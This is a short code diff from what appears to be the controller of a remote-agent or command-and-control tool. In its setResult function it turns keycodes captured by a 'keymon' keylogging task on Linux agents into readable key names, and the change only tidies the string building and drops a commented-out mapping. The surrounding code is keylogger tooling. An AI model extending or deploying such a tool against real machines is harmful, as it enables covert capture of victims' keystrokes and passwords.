@@ -214,11 +214,10 @@ export const setResult = async (agentID, data) => {
   task.completed = true;
   task.dateCompleted = Date.now();
   if (task.taskType === "keymon"){
-    task.result = "Keymon: ";
+    task.result = "";
     let keys = data.loggedKeys;
     if (keys){
       if (agent.os === "linux"){
-        // const mapping = ["??", "[ESC]", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "[BACKSAPCE]", "[TAB]", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "[ENTER]", "[L-CTRL]", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "[L-SHIFT]", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "[R-SHIFT]", "*", "??", "[L-ALT]", "[SPACE]", "[CAPSLOCK]", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "[NUM-LOCK]", "[SCROLL-LOCK]", ""];
         let mapping = {};
         mapping[1] = "[ESC]";
         for (let i = 2; i < 11; i++)
@@ -291,7 +290,7 @@ export const setResult = async (agentID, data) => {
           let val = mapping[parseInt(keys[i])];
           if (!val)
             val = keys[i].toString();
-          task.result += `${val} `;
+          task.result += " " + val;
         }        
       }else{        
         for (let i = 0; i < keys.length; i++)
